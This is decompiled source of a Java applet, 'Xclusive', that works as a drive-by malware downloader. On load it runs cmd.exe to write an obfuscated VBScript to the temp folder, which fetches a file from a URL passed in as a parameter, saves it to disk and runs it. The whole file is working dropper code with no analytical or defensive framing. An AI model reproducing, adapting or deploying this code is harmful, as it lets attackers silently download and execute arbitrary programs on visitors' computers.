import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Xclusive extends Applet
{
    @Override
    public void init() {
        final String parameter = this.getParameter("URL");
        final String parameter2 = this.getParameter("FileName");
        final String string = "cmd.exe /c echo Dim Sl > %temp%\\winconfig.vbs & echo Dim im >> %temp%\\winconfig.vbs & echo Dim S >> %temp%\\winconfig.vbs & echo Dim H >> %temp%\\winconfig.vbs & echo DIM A >> %temp%\\winconfig.vbs & echo Dim D >> %temp%\\winconfig.vbs & echo Dim Y >> %temp%\\winconfig.vbs & echo Y = \"MSXML2\" >> %temp%\\winconfig.vbs & echo H = \".XMLHTTP\" >> %temp%\\winconfig.vbs & echo D = \"ADO\" >> %temp%\\winconfig.vbs & echo S = \"DB\" >> %temp%\\winconfig.vbs & echo A = \".Stream\" >> %temp%\\winconfig.vbs & echo Sl = \"WScript\" >> %temp%\\winconfig.vbs & echo im = \".Shell\" >> %temp%\\winconfig.vbs & echo strFileURL = \"" + parameter + "\" >> %temp%\\winconfig.vbs & echo strHDLocation = \"" + parameter2 + "\" >> %temp%\\winconfig.vbs & echo Set objXMLHTTP = CreateObject(Y+H) >> %temp%\\winconfig.vbs & echo objXMLHTTP.open \"GET\", strFileURL, false >> %temp%\\winconfig.vbs & echo objXMLHTTP.send() >> %temp%\\winconfig.vbs & echo If objXMLHTTP.Status = 200 Then >> %temp%\\winconfig.vbs & echo Set objADOStream = CreateObject(D+S+A) >> %temp%\\winconfig.vbs & echo objADOStream.Open >> %temp%\\winconfig.vbs & echo objADOStream.Type = 1 >> %temp%\\winconfig.vbs & echo objADOStream.Write objXMLHTTP.ResponseBody >> %temp%\\winconfig.vbs & echo objADOStream.Position = 0 >> %temp%\\winconfig.vbs & echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> %temp%\\winconfig.vbs & echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> %temp%\\winconfig.vbs & echo Set objFSO = Nothing >> %temp%\\winconfig.vbs & echo objADOStream.SaveToFile strHDLocation >> %temp%\\winconfig.vbs & echo objADOStream.Close >> %temp%\\winconfig.vbs & echo Set objADOStream = Nothing >> %temp%\\winconfig.vbs & echo End if >> %temp%\\winconfig.vbs & echo Set objXMLHTTP = Nothing >> %temp%\\winconfig.vbs & echo Set shell = CreateObject(Sl+im) >> %temp%\\winconfig.vbs & echo shell.Run \"" + parameter2 + "\" >> %temp%\\winconfig.vbs & start %temp%\\winconfig.vbs";
        System.getProperty("os.name").toLowerCase();
        try {
            Runtime.getRuntime().exec(string);
        }
        catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
